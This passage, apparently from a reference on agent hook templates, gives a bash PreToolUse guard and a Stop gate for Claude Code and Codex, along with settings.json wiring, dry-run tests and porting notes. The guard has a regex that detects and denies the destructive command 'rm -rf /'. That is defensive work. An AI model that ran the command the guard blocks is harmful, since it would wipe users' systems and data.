[[ "$TOOL_NAME" != "Bash" ]] && exit 0

# Minimal example; reuse the segment-based rm / force-push checks from the Claude
# PreToolUse template above for real coverage.
if printf '%s' "$CMD" | grep -qE '(^|[[:space:]])rm[[:space:]]+-rf[[:space:]]+/($|[[:space:]])'; then
  jq -cn '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: "Blocked destructive rm -rf / command."
    }
  }'
  exit 0
fi
exit 0
```

`Stop` gate (`~/.codex/hooks/stop_gate.sh`) — `decision: "block"` does not reject; it makes Codex continue, using `reason` as the next prompt:

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT="$(git rev-parse --show-toplevel 2>/dev/null || echo "$PWD")"

# Illustrative gate. For a real one use a cached/async test result, not a full
# suite on every Stop — a synchronous suite here violates the fast-hook rule.
# If the Codex payload carries a loop-guard field (Claude's is stop_hook_active),
# exit 0 when it is true so a persistent marker cannot force endless turns.
[[ "$(jq -r '.stop_hook_active // false' 2>/dev/null || echo false)" == "true" ]] && exit 0
if [[ -f "$ROOT/.codex/state/tests-red" ]]; then
  jq -cn '{decision:"block", reason:"Tests are marked failing — fix them before ending the turn."}'
  exit 0
fi
exit 0
```

Notes:

- Shared stdin fields follow Claude's shape (`session_id`, `transcript_path`, `cwd`, `hook_event_name`, plus `tool_name`/`tool_input` on tool events). Confirm field names against the Codex reference before reading them, and build dry-run payloads from the documented names, not from what your script happens to read.
- Exit-code equivalents: for `PreToolUse`, exit `2` + stderr means deny; for `Stop`/`SubagentStop`, exit `2` + stderr means `decision: block`.
- Claude-only events (for example `PostToolBatch`, `WorktreeCreate`/`WorktreeRemove`, `ConfigChange`) have no Codex template here. Check the Codex matcher table before porting any of them.
- Set an explicit, tight `timeout` on synchronous guards instead of inheriting the default; look up the default and the global on/off switch (`[features]` in `config.toml`) in the Codex reference.
---

## Wiring: register the backfilled hooks

Drop the scripts in `~/.claude/hooks/` (or `.claude/hooks/`), `chmod +x` them, then register in `settings.json`. `PreCompact` matches on what triggered compaction (`manual`, `auto`) and `SessionStart` on how the session started (`startup`, `resume`, `clear`, `compact`, `fork`), so the restore hook is registered with `"matcher": "compact"` and only re-injects the checkpoint after a compaction. Events with no matcher field (`PostToolBatch`, `ConfigChange`, `WorktreeCreate`/`WorktreeRemove`) use `"matcher": ""`; confirm the current matcher table in the hooks reference before wiring a new event.

```json
{
  "hooks": {
    "PreCompact":     [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/precompact-checkpoint.sh" }] }],
    "SessionStart":   [{ "matcher": "compact", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/sessionstart-restore.sh" }] }],
    "PostToolBatch":  [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/posttoolbatch-gate.sh" }] }],
    "ConfigChange":   [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/configchange-audit.sh" }] }],
    "SubagentStart":  [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/subagent-context.sh" }] }],
    "SubagentStop":   [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/subagent-validate.sh" }] }],
    "WorktreeCreate": [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/worktree-create.sh" }] }],
    "WorktreeRemove": [{ "matcher": "", "hooks": [{ "type": "command", "command": "bash ~/.claude/hooks/worktree-remove.sh" }] }]
  }
}
```

Dry-run each before trusting it, using the input fields the event actually sends. Test the input the guard must block, not only the happy path: a guard that reads a wrong field name prints nothing and exits `0`, which looks like success.

```bash
echo '{"tool_calls":[{"tool_name":"Bash","tool_input":{"command":"pytest"},"tool_response":"1 failed, Traceback (most recent call last):"}]}' \
  | bash ~/.claude/hooks/posttoolbatch-gate.sh   # expect a {"decision":"block"} JSON line
echo '{"source":"local_settings","file_path":"/x/.claude/settings.json"}' \
  | bash ~/.claude/hooks/configchange-audit.sh    # expect a block + an audit-log line with source=local_settings
```

After editing any template in this file, run `python3 -m unittest scripts/test_hook_templates.py` from the skill root. It extracts each template, runs it against a payload built from the documented field names, and fails on any guard that stops blocking. Re-check the payload field names against the hooks reference when the runtime's changelog mentions a hook input change.

## Notes

- For Claude HTTP, prompt, or agent hooks, keep the wiring in `settings.local.json` and let the hook type do the heavy lifting. Those are config-native patterns, not shell-script templates.
- Prefer `ConfigChange`, `PreCompact`, `WorktreeCreate`, and `WorktreeRemove` for repo lifecycle concerns instead of overloading `Stop`.
- Run ShellCheck on non-trivial bash hooks before rollout.
- A snapshot or WIP-commit hook that reads or copies the index must locate it with `git rev-parse --git-path index`; `.git/index` is wrong inside a worktree, where `.git` is a file pointing at the shared repository.

---

## Navigation

- [SKILL.md](../SKILL.md) - Main reference
- [hook-patterns.md](hook-patterns.md) - Async, HTTP, compaction, and worktree patterns
- [hook-security.md](hook-security.md) - Shell hardening and event-safety guidance
